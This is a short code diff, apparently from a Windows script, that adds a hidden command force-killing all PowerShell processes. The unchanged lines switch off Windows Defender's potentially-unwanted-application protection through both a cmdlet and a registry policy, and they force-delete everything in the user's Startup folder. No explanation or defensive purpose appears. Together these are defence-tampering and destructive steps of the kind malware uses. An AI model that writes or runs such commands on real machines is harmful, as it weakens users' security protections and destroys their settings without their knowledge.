@@ -1,3 +1,4 @@
+objShell.Run "powershell.exe -Command Get-Process -Name powershell | Stop-Process -Force", 0, True
 Set-MpPreference -PUAProtection 0
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'PUAProtection' -Value 0
 Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*" -Force
